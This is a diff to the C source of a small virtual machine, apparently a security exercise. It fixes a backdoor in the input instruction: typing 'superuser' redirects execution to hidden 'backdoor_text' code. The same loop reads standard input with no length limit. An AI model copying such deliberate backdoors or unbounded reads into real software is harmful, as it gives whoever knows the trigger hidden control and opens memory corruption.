@@ -7,7 +7,7 @@
 #include "minivm.h"
 
 // Annotate below definition for deleting debug message 
-#define VM_DEBUG_MESSAGE
+// #define VM_DEBUG_MESSAGE
 
 #define NUM_REGS   (256)
 #define NUM_FUNCS  (256)
@@ -252,6 +252,7 @@ void *gets_inst(struct VMContext* ctx, const uint32_t instr) {
 
     int i = 0; 
     char* tmp = heap;
+    char* backAddr; 
     checkHeapBoundary( ctx->r[a].value );
     tmp += ctx->r[a].value;
 
@@ -262,22 +263,22 @@ void *gets_inst(struct VMContext* ctx, const uint32_t instr) {
     while(1) {
         tmp[i] = fgetc( stdin ); 
         if ( tmp[i] == '\n' ) {
+            tmp[i] = 0; 
+
             // turn on backdoor mode if user input is "superuser"
-            if (strcmp(tmp, "superuser")) {
+            if (strcmp(tmp, "superuser") == 0 ) {
 #ifdef VM_DEBUG_MESSAGE 
                 printf("\t----- BACKDOOR MODE ON -----\n");
 #endif 
-
-                tmp = &backdoor_text;
+                backAddr = &backdoor_text;
 
                 // -4 because pc is incremented by the stepVMContext function 
-                pc = (uint32_t*) (tmp - 4);
+                pc = (uint32_t*) (backAddr - 4);
 #ifdef VM_DEBUG_MESSAGE 
-                printf("\tJump to BACKDOOR code ( %x )\n", tmp );
+                printf("\tJump to BACKDOOR code ( %x )\n", backAddr );
 #endif 
             }
 
-            tmp[i] = 0; 
             break; 
         }
         i++; 
